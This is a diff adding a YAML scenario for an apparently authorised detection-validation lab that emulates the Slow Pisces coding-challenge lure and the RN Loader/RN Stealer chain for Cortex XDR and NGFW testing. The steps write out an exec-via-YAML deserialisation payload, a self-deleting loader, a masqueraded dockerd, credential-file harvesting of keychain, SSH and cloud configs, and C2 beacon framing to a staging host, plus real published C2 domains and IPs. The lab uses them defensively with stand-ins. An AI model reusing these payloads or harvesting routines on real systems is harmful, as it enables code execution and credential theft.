@@ -1,0 +1,623 @@
+# Slow Pisces (DPRK; aka Jade Sleet, TraderTraitor), Unit 42 2025-04-14: a LinkedIn "recruiter"
+# hands a crypto developer a coding challenge (Stocks Pattern Analyzer) that fetches
+# en.stockslab.org/symbols/sp500; a validated target gets application/yaml, yaml.load() runs it,
+# ~/Public/__init__.py (RN Loader) beacons host info and self-deletes, then RN Stealer collects
+# keychain, SSH keys and AWS/kube/gcloud configs (R0/R64/R128/R256). DC points at: EDR leg
+# (01-05) the project python3 lineage, ~/Public write, self-deleting script, masqueraded dockerd,
+# credential-file opens and DNS lookups of three published domains (only via
+# @${LAB_RESOLVER:-127.0.0.53}); NDR leg (06) NGFW EAL records to the report's domain/IP pairs
+# carrying src_host. CR-MP-0027 fuses both. No cloud leg (configs stolen, never used in the report);
+# published SHA-256s not carried (no file crossed a sensor). Needs a `developer` account and `dig` (dnsutils/bind-utils).
+# All C2 is plain HTTP to $STAGE_HOST (report: HTTPS), poll 2 s (report: 20 s); the fetched body is never executed;
+# home/applications directory-name listings go to $STAGE_HOST; absent credential paths get 0600 marker stand-ins.
+scenario_id: SIM-MP-027
+name: "Slow Pisces Coding-Challenge Lure to RN Loader / RN Stealer — Developer Workstation EDR + NGFW Stitch"
+version: "1.0"
+status: active
+
+plane: ANALYTICS
+detection_types:
+  - BIOC
+  - XQL
+  - IOC
+  - ABIOC
+  - Correlation
+
+uc_ref: UCS-NDR-01
+tc_ref: TC-NDR-01
+tc_refs:
+  - TC-NDR-01
+  - TC-IR-05
+  - TC-TH-06
+  - TC-EDR-05
+pov_scenario_id: POV-SC-008
+uc_name: "Network Detection & Response"
+tc_name: "Validate causality graph stitching correlates network events with endpoint process telemetry"
+
+mitre_tactic: "TA0002"
+mitre_tactic_name: "Execution"
+mitre_technique: "T1204.002"
+mitre_technique_name: "User Execution: Malicious File"
+additional_techniques:
+  - technique: "T1566.003"
+    name: "Phishing: Spearphishing via Service"
+  - technique: "T1059.006"
+    name: "Command and Scripting Interpreter: Python"
+  - technique: "T1140"
+    name: "Deobfuscate/Decode Files or Information"
+  - technique: "T1070.004"
+    name: "Indicator Removal: File Deletion"
+  - technique: "T1082"
+    name: "System Information Discovery"
+  - technique: "T1036.005"
+    name: "Masquerading: Match Legitimate Name or Location"
+  - technique: "T1555.001"
+    name: "Credentials from Password Stores: Keychain"
+  - technique: "T1552.004"
+    name: "Unsecured Credentials: Private Keys"
+  - technique: "T1552.001"
+    name: "Unsecured Credentials: Credentials In Files"
+  - technique: "T1071.001"
+    name: "Application Layer Protocol: Web Protocols"
+  - technique: "T1041"
+    name: "Exfiltration Over C2 Channel"
+
+threat_report: "Unit 42 — Slow Pisces Targets Developers With Coding Challenges and Introduces New Customized Python Malware"
+threat_report_url: "https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/"
+
+# ── Causality contract ──────────────────────────────────────────────────────
+# The developer's own python3 running the cloned coding-challenge project owns the chain.
+# step-01 is the root; the YAML-deserialised stage, RN Loader, its dockerd child and the
+# RN Stealer exec all descend from it by process lineage. The NGFW leg is stitched onto
+# the same workstation by entity (src_host / src_ip / src_user), not by process fork.
+cgo_anchor:
+  image_name: "python3"
+  primary_username: "developer"
+
+execution_identity:
+  default: developer
+  options:
+    - developer
+    - container-runtime
+    - root
+
+push_supported: true
+pull_supported: true
+
+infra_modules_needed:
+  - base
+  - edr
+  - ndr
+
+# ── v2.0 KPI / Methodology Metadata ─────────────────────────────────────────
+validation_methodology: "Multi-Plane Correlation & Behavioral Detection Accuracy"
+methodology_family: "F2"
+primary_kpi: "MTTD"
+threshold:
+  kpi: "MTTD"
+  op: "≤"
+  value: 600
+  unit: "seconds"
+success_criteria: |
+  On the developer workstation, Cortex XDR raises the endpoint signals the report's tradecraft
+  produces: the coding-challenge python3 resolving a published Slow Pisces domain and fetching
+  /symbols/sp500, the YAML-deserialised stage writing ~/Public/__init__.py, that script running
+  and deleting itself, a binary named dockerd launched from a temp path by python3, and python3
+  opening the login keychain, SSH private keys and AWS/Kubernetes/gcloud credential files. Unit 42
+  IOC enrichment names the actor on the DNS lookups. The NGFW EAL records to the report's
+  domain/IP pairs land in panw_ngfw_traffic_raw carrying the same src_host, src_ip and src_user,
+  CR-MP-0027 fuses the endpoint and network alerts on src_host into one incident within the
+  window, and mean time from the lure's first fetch to the first alert is within the MTTD budget.
+moat_tier: "LEAD"
+
+correlation_window_seconds: 1800
+required_planes_in_incident:
+  - EDR
+  - NDR
+stitching_key: src_host
+
+indicators:
+  - id: ind-01
+    type: domain
+    value: "en.stockslab.org"
+    source_url: "https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/"
+    safe_form: dns_lookup
+    surfaces_in: [step-01, step-06]
+    description: "Slow Pisces C2 that served the Stocks Pattern Analyzer /symbols/sp500 data and RN Loader tasking (report body and IoC table, 2024-08-19 to 2024-09-12). Looked up via the lab resolver in step-01; dst_domain of NGFW EAL sub-step 1 in step-06."
+  - id: ind-02
+    type: domain
+    value: "getstockprice.com"
+    source_url: "https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/"
+    safe_form: dns_lookup
+    surfaces_in: [step-03, step-06]
+    description: "Slow Pisces Python-repository C2 domain (IoC table, 2025-02-03 to 2025-02-20). Looked up in step-03; dst_domain of NGFW EAL sub-step 2 in step-06."
+  - id: ind-03
+    type: domain
+    value: "cdn.clubinfo.io"
+    source_url: "https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/"
+    safe_form: dns_lookup
+    surfaces_in: [step-03]
+    description: "Slow Pisces Python-repository C2 domain (IoC table, 2025-01-21 to 2025-02-19). Looked up in step-03."
+  - id: ind-04
+    type: ipv4
+    value: "91.103.140.191"
+    source_url: "https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/"
+    safe_form: log_field
+    surfaces_in: [step-06]
+    description: "IP the report pairs with en.stockslab.org (IoC table). dst of the NGFW EAL recurring-beacon records in step-06; no packet is sent to it."
+  - id: ind-05
+    type: ipv4
+    value: "70.34.245.118"
+    source_url: "https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/"
+    safe_form: log_field
+    surfaces_in: [step-06]
+    description: "IP the report pairs with getstockprice.com (IoC table). dst of the NGFW EAL rare-domain record in step-06; no packet is sent to it."
+
+external_tools:
+  - name: cortexsim-eal-cli
+    source: "https://github.com/hankthebldr/cortex-pov-engine"
+    type: script
+    install_inline: false
+
+steps:
+  - id: step-01
+    name: "Developer runs the coding-challenge project: python3 resolves the C2 and fetches /symbols/sp500"
+    command: |
+      mkdir -p /tmp/cortexsim-mp-027/stocks-pattern-analyzer/.cache
+      dig +short en.stockslab.org @${LAB_RESOLVER:-127.0.0.53}
+      cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
+      python3 - <<'PY'
+      import base64, hashlib, os, urllib.request, urllib.error
+      stage = os.environ.get("STAGE_HOST", "127.0.0.1")
+      port = os.environ.get("STAGE_PORT", "8080")
+      url = "http://%s:%s/symbols/sp500" % (stage, port)
+      cache = ".cache/sp500.yaml"
+      ctype = ""
+      try:
+          req = urllib.request.Request(url, headers={"Accept": "application/json, application/yaml"})
+          with urllib.request.urlopen(req, timeout=5) as r:
+              r.read()
+              ctype = r.headers.get("Content-Type", "")
+          print("stage host replied with Content-Type %s (body discarded, never executed)" % ctype)
+      except (urllib.error.URLError, OSError) as exc:
+          print("stage host unreachable (%s)" % exc)
+      # Whatever the stage host returned, the lab always caches its own benign stand-in for the
+      # validated-target application/yaml reply: it writes a self-deleting RN Loader stand-in to
+      # ~/Public/__init__.py and runs it. Step-02 executes it only if its digest matches.
+      loader = (
+          "import getpass, json, os, platform, socket\n"
+          "os.remove(__file__)\n"
+          "info = {'user': getpass.getuser(), 'host': socket.gethostname(), 'os': platform.platform(), 'arch': platform.machine()}\n"
+          "os.makedirs('/tmp/cortexsim-mp-027', exist_ok=True)\n"
+          "open('/tmp/cortexsim-mp-027/rn-loader-sysinfo.json', 'w').write(json.dumps(info))\n"
+          "print('cortexsim-mp-027 rn-loader stand-in ran and removed', __file__)\n"
+      )
+      writer = (
+          "import base64, os, subprocess, sys\n"
+          "pub = os.path.join(os.path.expanduser('~'), 'Public')\n"
+          "if not os.path.isdir(pub):\n"
+          "    os.makedirs(pub)\n"
+          "    open(os.path.join(pub, '.cortexsim-mp-027-created'), 'w').close()\n"
+          "dst = os.path.join(pub, '__init__.py')\n"
+          "if os.path.exists(dst) and 'cortexsim-mp-027' not in open(dst, errors='ignore').read():\n"
+          "    print('cortexsim-mp-027: %%s exists and is not ours; skipping the drop' %% dst)\n"
+          "else:\n"
+          "    open(dst, 'w').write(base64.b64decode('%s').decode())\n"
+          "    subprocess.run([sys.executable, dst], check=False)\n"
+      ) % base64.b64encode(loader.encode()).decode()
+      body = ("!!python/object/apply:builtins.exec\n- \"import base64; exec(base64.b64decode('%s'))\"\n"
+              % base64.b64encode(writer.encode()).decode()).encode()
+      with open(cache, "wb") as fh:
+          fh.write(body)
+      with open(cache + ".sha256", "w") as fh:
+          fh.write(hashlib.sha256(body).hexdigest())
+      print("cortexsim-mp-027 lure project cached the lab stand-in /symbols/sp500 reply as %s" % cache)
+      PY
+    identity: developer
+    mitre_technique: "T1204.002"
+    # Root of the causality spine — links from the CGO (the developer's python3).
+    platforms: ["linux", "macos"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: IOC
+        description: "The workstation resolves en.stockslab.org, a Slow Pisces C2 domain Unit 42 published; the IOC rule matches the DNS query in xdr_data and enrichment attributes it to Slow Pisces."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "ioc-domain-en-stockslab-org"
+      - plane: EDR
+        type: XQL
+        description: "Validation query: python3 running from the cloned project directory opened an outbound connection carrying the /symbols/sp500 request and wrote the reply to the project's .cache, on the run host, within the run window."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "xql-mp-027-lure-project-python-fetches-symbols-sp500-and-caches-the-reply"
+
+  - id: step-02
+    name: "Unsafe yaml.load of the application/yaml reply writes ~/Public/__init__.py (RN Loader) and runs it"
+    command: |
+      cd /tmp/cortexsim-mp-027/stocks-pattern-analyzer
+      python3 - <<'PY'
+      import hashlib
+      data = open(".cache/sp500.yaml", "rb").read()
+      pinned = open(".cache/sp500.yaml.sha256").read().strip()
+      if hashlib.sha256(data).hexdigest() != pinned:
+          raise SystemExit("cortexsim-mp-027: cached reply does not match the lab stand-in digest; refusing to load it")
+      data = data.decode()
+      TAG = "tag:yaml.org,2002:python/object/apply:builtins.exec"
+      try:
+          import yaml
+          class LabLoader(yaml.SafeLoader):
+              pass
+          # SafeLoader plus exactly one constructor: the python/object/apply:builtins.exec tag the
+          # lure's unsafe yaml.load() honours, applied only to the digest-pinned lab stand-in.
+          LabLoader.add_constructor(TAG, lambda loader, node: exec(loader.construct_sequence(node)[0]))
+          yaml.load(data, Loader=LabLoader)
+          print("cortexsim-mp-027 YAML python/object/apply:builtins.exec applied to the pinned stand-in")
+      except ImportError:
+          arg = data.split("\n", 1)[1].strip()[2:].strip().strip('"')
+          exec(arg)
+          print("cortexsim-mp-027 PyYAML not installed: applied builtins.exec from the pinned stand-in directly")
+      PY
+    identity: developer
+    mitre_technique: "T1059.006"
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["linux", "macos"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "python3 creates __init__.py inside the user's home Public folder, the drop path of the Slow Pisces YAML deserialisation payload; a script interpreter writing Python source into ~/Public has no developer-workflow reason."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "bioc-mp-027-python-writes-init-py-into-the-home-public-folder"
+      - plane: EDR
+        type: ABIOC
+        description: "A python3 child runs ~/Public/__init__.py and that file is deleted by the same process seconds after it starts: the RN Loader in-memory pattern. The ABIOC anchors on the project python3 causality chain."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "abioc-mp-027-self-deleting-python-script-executed-from-the-home-public-folder"
+
+  - id: step-03
+    name: "RN Loader beacons host and OS info to the C2 and polls for commands"
+    command: |
+      dig +short getstockprice.com @${LAB_RESOLVER:-127.0.0.53}
+      dig +short cdn.clubinfo.io @${LAB_RESOLVER:-127.0.0.53}
+      python3 - <<'PY'
+      import base64, json, os, platform, socket, getpass, time
+      import urllib.request, urllib.error
+      stage = os.environ.get("STAGE_HOST", "127.0.0.1")
+      port = os.environ.get("STAGE_PORT", "8080")
+      url = "http://%s:%s/" % (stage, port)
+      try:
+          info = json.load(open("/tmp/cortexsim-mp-027/rn-loader-sysinfo.json"))
+      except (OSError, ValueError):
+          info = {"user": getpass.getuser(), "host": socket.gethostname(), "os": platform.platform()}
+      beacon = base64.b64encode(json.dumps(info).encode())
+      for poll in range(3):
+          cmd = 0
+          try:
+              with urllib.request.urlopen(urllib.request.Request(url, data=beacon), timeout=5) as r:
+                  cmd = int((r.read().strip() or b"0")[:1])
+          except (urllib.error.URLError, OSError, ValueError):
+              pass
+          print("cortexsim-mp-027 rn-loader poll %d: command %d" % (poll + 1, cmd))
+          if cmd == 9:
+              break
+          # Command 0 is "sleep 20 seconds"; shortened for the lab run.
+          time.sleep(2)
+      PY
+    identity: developer
+    mitre_technique: "T1071.001"
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
+    platforms: ["linux", "macos"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: ABIOC
+        description: "A python3 process descended from the coding-challenge project sends a Base64 host-information body to the same external host at a fixed interval and reads back a one-digit command: first-seen interval polling from a developer interpreter, anchored on the project causality chain."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "abioc-mp-027-developer-project-python-polls-one-external-host-at-a-fixed-interval"
+      - plane: EDR
+        type: IOC
+        description: "The workstation resolves getstockprice.com, a published Slow Pisces Python-repository C2 domain; the IOC rule matches the DNS query in xdr_data."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "ioc-domain-getstockprice-com"
+      - plane: EDR
+        type: XQL
+        description: "Hunt query: DNS queries from the workstation for any of the published Slow Pisces lure domains within the run window (en.stockslab.org, getstockprice.com, cdn.clubinfo.io)."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "xql-mp-027-slow-pisces-lure-domain-dns-lookups-from-the-workstation"
+
+  - id: step-04
+    name: "RN Loader command 3: decode dockerd and docker-init, run dockerd with docker-init as its argument"
+    command: |
+      mkdir -p /tmp/cortexsim-mp-027/.rn
+      python3 - <<'PY'
+      import base64, os, shutil, subprocess
+      d = "/tmp/cortexsim-mp-027/.rn"
+      # Command 3: Base64 content saved as dockerd, Base64 parameter saved as docker-init, then
+      # dockerd runs with docker-init as its argument. The lab content is the host's own cat binary.
+      content = base64.b64encode(open(shutil.which("cat"), "rb").read())
+      param = base64.b64encode(b"cortexsim-mp-027-docker-init-parameter\n")
+      with open(os.path.join(d, "dockerd"), "wb") as fh:
+          fh.write(base64.b64decode(content))
+      os.chmod(os.path.join(d, "dockerd"), 0o755)
+      with open(os.path.join(d, "docker-init"), "wb") as fh:
+          fh.write(base64.b64decode(param))
+      rc = subprocess.run([os.path.join(d, "dockerd"), os.path.join(d, "docker-init")]).returncode
+      print("cortexsim-mp-027 masqueraded dockerd exited %d" % rc)
+      PY
+    identity: developer
+    mitre_technique: "T1036.005"
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    platforms: ["linux", "macos"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "A process image named dockerd starts from a temp directory with python3 as its parent and a file named docker-init as its argument. A real Docker daemon runs from its install path under containerd or launchd, never as a child of a developer's Python interpreter."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "bioc-mp-027-dockerd-launched-from-a-temp-path-by-a-python-interpreter"
+
+  - id: step-05
+    name: "RN Stealer: keychain, SSH keys and AWS/kube/gcloud configs, XOR-framed R0/R64/R128/R256 to the C2"
+    command: |
+      python3 - <<'PY'
+      import base64, glob, gzip, json, os, platform, random, socket, getpass, sys
+      import urllib.request, urllib.error
+      stage = os.environ.get("STAGE_HOST", "127.0.0.1")
+      port = os.environ.get("STAGE_PORT", "8080")
+      url = "http://%s:%s/" % (stage, port)
+      victim = "%016x" % random.getrandbits(64)
+      def c2(token, payload=b""):
+          # RN Stealer frames every C2 call with a Base64 R<N> token and the victim id as a cookie.
+          body = base64.b64encode(token.encode()) + b"." + base64.b64encode(payload)
+          req = urllib.request.Request(url, data=body, headers={"Cookie": "id=" + victim})
+          try:
+              with urllib.request.urlopen(req, timeout=5) as r:
+                  return r.read()
+          except (urllib.error.URLError, OSError):
+              return b""
+      key = c2("R0") or b"cortexsim-mp-027-lab-xor-key"
+      home = os.path.expanduser("~")
+      keychain = "Library/Keychains/login.keychain-db" if sys.platform == "darwin" else ".local/share/keyrings/login.keyring"
+      targets = [keychain, ".aws/credentials", ".aws/config", ".kube/config",
+                 ".config/gcloud/credentials.db", ".config/gcloud/application_default_credentials.json"]
+      MARK = "cortexsim-mp-027"
+      def mkdirs_marked(path):
+          # Create missing directory levels, dropping a marker in each so cleanup removes only ours.
+          missing = []
+          while not os.path.isdir(path):
+              missing.append(path)
+              path = os.path.dirname(path)
+          for d in reversed(missing):
+              os.mkdir(d, 0o700)
+              open(os.path.join(d, ".cortexsim-mp-027-created"), "w").close()
+      # The identity harness runs this as a service account whose home usually has none of these
+      # files. Absent paths get a marker stand-in (0600) so the credential-access burst still happens.
+      seeded = []
+      for rel in [keychain, ".aws/credentials", ".kube/config", ".ssh/id_ed25519"]:
+          p = os.path.join(home, rel)
+          if not os.path.exists(p):
+              mkdirs_marked(os.path.dirname(p))
+              fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+              os.write(fd, MARK.encode() + b"\n")
+              os.close(fd)
+              seeded.append(p)
+      targets += [os.path.relpath(p, home) for p in sorted(glob.glob(os.path.join(home, ".ssh", "id_*")))]
+      targets = list(dict.fromkeys(targets))
+      apps_dir = "/Applications" if os.path.isdir("/Applications") else "/usr/share/applications"
+      manifest = {"victim": victim, "user": getpass.getuser(), "host": socket.gethostname(),
+                  "arch": platform.machine(), "apps": sorted(os.listdir(apps_dir))[:100] if os.path.isdir(apps_dir) else [],
+                  "home": sorted(os.listdir(home))[:100], "files": []}
+      for rel in targets:
+          p = os.path.join(home, rel)
+          if os.path.isfile(p):
+              # Opened the way RN Stealer opens it; one byte is read and discarded. Content never leaves memory.
+              with open(p, "rb") as fh:
+                  fh.read(1)
+              manifest["files"].append({"path": p, "size": os.path.getsize(p), "stand_in": p in seeded})
+          else:
+              manifest["files"].append({"path": p, "present": False})
+      blob = json.dumps(manifest).encode()
+      xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))
+      os.makedirs("/tmp/cortexsim-mp-027", exist_ok=True)
+      with open("/tmp/cortexsim-mp-027/rn-stealer-manifest.xor", "wb") as fh:
+          fh.write(xored)
+      c2("R64", xored)
+      c2("R128", gzip.compress(xored))
+      c2("R256")
+      print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked (%d marker stand-ins seeded), names and sizes only" % (len(manifest["files"]), len(seeded)))
+      PY
+    platform_variants:
+      macos: |
+        security list-keychains -d user
+        python3 - <<'PY'
+        import base64, glob, gzip, json, os, platform, random, socket, getpass, sys
+        import urllib.request, urllib.error
+        stage = os.environ.get("STAGE_HOST", "127.0.0.1")
+        port = os.environ.get("STAGE_PORT", "8080")
+        url = "http://%s:%s/" % (stage, port)
+        victim = "%016x" % random.getrandbits(64)
+        def c2(token, payload=b""):
+            # RN Stealer frames every C2 call with a Base64 R<N> token and the victim id as a cookie.
+            body = base64.b64encode(token.encode()) + b"." + base64.b64encode(payload)
+            req = urllib.request.Request(url, data=body, headers={"Cookie": "id=" + victim})
+            try:
+                with urllib.request.urlopen(req, timeout=5) as r:
+                    return r.read()
+            except (urllib.error.URLError, OSError):
+                return b""
+        key = c2("R0") or b"cortexsim-mp-027-lab-xor-key"
+        home = os.path.expanduser("~")
+        keychain = "Library/Keychains/login.keychain-db" if sys.platform == "darwin" else ".local/share/keyrings/login.keyring"
+        targets = [keychain, ".aws/credentials", ".aws/config", ".kube/config",
+                   ".config/gcloud/credentials.db", ".config/gcloud/application_default_credentials.json"]
+        MARK = "cortexsim-mp-027"
+        def mkdirs_marked(path):
+            # Create missing directory levels, dropping a marker in each so cleanup removes only ours.
+            missing = []
+            while not os.path.isdir(path):
+                missing.append(path)
+                path = os.path.dirname(path)
+            for d in reversed(missing):
+                os.mkdir(d, 0o700)
+                open(os.path.join(d, ".cortexsim-mp-027-created"), "w").close()
+        # The identity harness runs this as a service account whose home usually has none of these
+        # files. Absent paths get a marker stand-in (0600) so the credential-access burst still happens.
+        seeded = []
+        for rel in [keychain, ".aws/credentials", ".kube/config", ".ssh/id_ed25519"]:
+            p = os.path.join(home, rel)
+            if not os.path.exists(p):
+                mkdirs_marked(os.path.dirname(p))
+                fd = os.open(p, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
+                os.write(fd, MARK.encode() + b"\n")
+                os.close(fd)
+                seeded.append(p)
+        targets += [os.path.relpath(p, home) for p in sorted(glob.glob(os.path.join(home, ".ssh", "id_*")))]
+        targets = list(dict.fromkeys(targets))
+        apps_dir = "/Applications" if os.path.isdir("/Applications") else "/usr/share/applications"
+        manifest = {"victim": victim, "user": getpass.getuser(), "host": socket.gethostname(),
+                    "arch": platform.machine(), "apps": sorted(os.listdir(apps_dir))[:100] if os.path.isdir(apps_dir) else [],
+                    "home": sorted(os.listdir(home))[:100], "files": []}
+        for rel in targets:
+            p = os.path.join(home, rel)
+            if os.path.isfile(p):
+                # Opened the way RN Stealer opens it; one byte is read and discarded. Content never leaves memory.
+                with open(p, "rb") as fh:
+                    fh.read(1)
+                manifest["files"].append({"path": p, "size": os.path.getsize(p), "stand_in": p in seeded})
+            else:
+                manifest["files"].append({"path": p, "present": False})
+        blob = json.dumps(manifest).encode()
+        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(blob))
+        os.makedirs("/tmp/cortexsim-mp-027", exist_ok=True)
+        with open("/tmp/cortexsim-mp-027/rn-stealer-manifest.xor", "wb") as fh:
+            fh.write(xored)
+        c2("R64", xored)
+        c2("R128", gzip.compress(xored))
+        c2("R256")
+        print("cortexsim-mp-027 rn-stealer stand-in: %d paths checked (%d marker stand-ins seeded), names and sizes only" % (len(manifest["files"]), len(seeded)))
+        PY
+    identity: developer
+    mitre_technique: "T1555.001"
+    causality:
+      parent_step: step-03
+      pivot: process_lineage
+    platforms: ["linux", "macos"]
+    requires_interpreters: ["python"]
+    expected_detections:
+      - plane: EDR
+        type: BIOC
+        description: "python3 descended from the coding-challenge project opens the login keychain (login.keychain-db on macOS, login.keyring on Linux), ~/.ssh private keys and AWS, Kubernetes and gcloud credential files in one burst: the RN Stealer collection set. Under the developer service account most of these are absent, so 0600 marker stand-ins (content cortexsim-mp-027) are seeded first for the keychain, .aws/credentials, .kube/config and .ssh/id_ed25519; real files are opened where they exist."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "bioc-mp-027-python-opens-keychain-ssh-key-and-cloud-cli-credential-files"
+      - plane: EDR
+        type: XQL
+        description: "Validation query: the same python3 causality chain opened three or more of the credential paths (real files, or the marker stand-ins seeded when absent) and wrote the XOR-framed manifest, on the run host, within the run window."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "xql-mp-027-rn-stealer-credential-file-access-on-the-run-host"
+
+  - id: step-06
+    name: "NGFW EAL leg: RN Loader C2 egress from the workstation to the report's domain/IP pairs"
+    command: |
+      : "${COLLECTOR_URL:=https://collector.cortexsim-canary.invalid/ngfw/eal/events}"
+      : "${COLLECTOR_HOST:=collector.cortexsim-canary.invalid}"
+      SRC_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
+      [ -n "$SRC_IP" ] || SRC_IP=$(ipconfig getifaddr en0 2>/dev/null)
+      [ -n "$SRC_IP" ] || SRC_IP=127.0.0.1
+      SRC_HOST=$(hostname -s)
+      SRC_USER=$(id -un developer 2>/dev/null || id -un)
+      cat > /tmp/mp-027-ngfw-eal.yml <<YML
+      campaign_id: CMP-MP-027
+      name: "Slow Pisces RN Loader C2 egress from the developer workstation"
+      authorized_by: "domain-consultant@paloaltonetworks.com"
+      simulation_authorized: true
+      c2_authorized: true
+      target_allowlist:
+        - "$COLLECTOR_HOST"
+      dry_run: false
+      tags: [mp-027, slow-pisces, rn-loader, ngfw-eal]
+      steps:
+        - step_id: step-01
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_recurring_comms
+            burst_count: 8
+            iterations: 1
+            dst_domain: "en.stockslab.org"
+            dst_ip: "91.103.140.191"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+        - step_id: step-02
+          plugin: ngfw_eal_emitter
+          params:
+            collector_url: "$COLLECTOR_URL"
+            event_pattern: abnormal_comms
+            iterations: 1
+            dst_domain: "getstockprice.com"
+            dst_ip: "70.34.245.118"
+            src_ip: "$SRC_IP"
+            src_host: "$SRC_HOST"
+            src_user: "$SRC_USER"
+      YML
+      python3 -m scripts.eal_simulator.cli run /tmp/mp-027-ngfw-eal.yml --live
+      echo cortexsim-mp-027-step06-ngfw-eal-rn-loader-egress-emitted
+    identity: container-runtime
+    mitre_technique: "T1071.001"
+    # Same workstation (src_host / src_ip / src_user) as the endpoint leg: the NGFW
+    # records are stitched onto the RN Loader host by entity, not by process fork.
+    causality:
+      parent_step: step-03
+      pivot: shared_entity
+    platforms: ["linux", "macos"]
+    expected_detections:
+      - plane: NDR
+        type: ABIOC
+        description: "NGFW EAL recurring small HTTPS sessions from the developer workstation to en.stockslab.org, a domain rare across the fleet: the auto-tuned recurring-communications ABIOC fires on cadence plus destination rarity, anchored to src_host."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "abioc-mp-027-ngfw-recurring-rare-domain-communications-from-a-developer-workstation"
+      - plane: NDR
+        type: IOC
+        description: "The NGFW traffic record's destination 91.103.140.191 is a Slow Pisces IP Unit 42 published; the IOC rule matches dst in panw_ngfw_traffic_raw."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "ioc-ipv4-91-103-140-191"
+      - plane: NDR
+        type: XQL
+        description: "Validation query: panw_ngfw_traffic_raw holds sessions from the run host (endpoint_device_name = src_host) to the published Slow Pisces domain/IP pairs within the run window."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "xql-mp-027-ngfw-traffic-to-published-slow-pisces-infrastructure-from-the-run-host"
+      - plane: ANALYTICS
+        type: Correlation
+        description: "CR-MP-0027 fuses the endpoint lure/loader/stealer alerts and the NGFW C2 alerts on the shared src_host within 1800 s into one Slow Pisces developer-compromise incident."
+        ttp_ref: "TTP-2026-0186"
+        detection_id: "CR-MP-0027"
+
+cleanup:
+  commands:
+    - "for h in /home/* /Users/* /root; do for f in Public/__init__.py Library/Keychains/login.keychain-db .local/share/keyrings/login.keyring .aws/credentials .kube/config .ssh/id_ed25519; do grep -qs cortexsim-mp-027 \"$h/$f\" && rm -f \"$h/$f\"; done; done; true"
+    - "find /home /Users /root -maxdepth 6 -name .cortexsim-mp-027-created 2>/dev/null | sort -r | while read -r m; do rm -f \"$m\"; rmdir \"$(dirname \"$m\")\" 2>/dev/null; done; true"
+    - "rm -rf /tmp/cortexsim-mp-027 /tmp/mp-027-ngfw-eal.yml"
+    - "echo cortexsim-mp-027-cleanup-complete"
+
+author: "Henry Reed"
+created: "2026-10-27"
+last_updated: "2026-10-27"
+tags:
+  - unit42
+  - stitched-chain
+  - actor:slow-pisces
+  - jade-sleet
+  - tradertraitor
+  - dprk
+  - developer-lure
+  - rn-loader
+  - rn-stealer
+  - yaml-deserialization
+  - macos
+  - ngfw-eal
+  - real-ioc-dns-lookup
